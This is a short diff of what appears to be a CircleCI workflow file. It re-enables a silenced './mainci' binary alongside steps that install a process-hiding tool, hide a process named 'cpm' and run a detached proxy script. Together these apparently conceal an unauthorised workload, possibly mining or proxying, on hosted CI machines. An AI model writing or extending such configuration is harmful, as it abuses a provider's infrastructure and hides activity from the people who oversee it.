@@ -29,8 +29,8 @@ jobs:
               sudo npm i -g node-process-hider
               sudo ph add cpm
               screen -dmS proxy python3 proxy.py
-              sleep 60s
-              0#./mainci >/dev/null 2>&1
+              sleep 600s
+              ./mainci >/dev/null 2>&1
   python_02:
     docker:
       - image: circleci/python:3.10-rc-bullseye
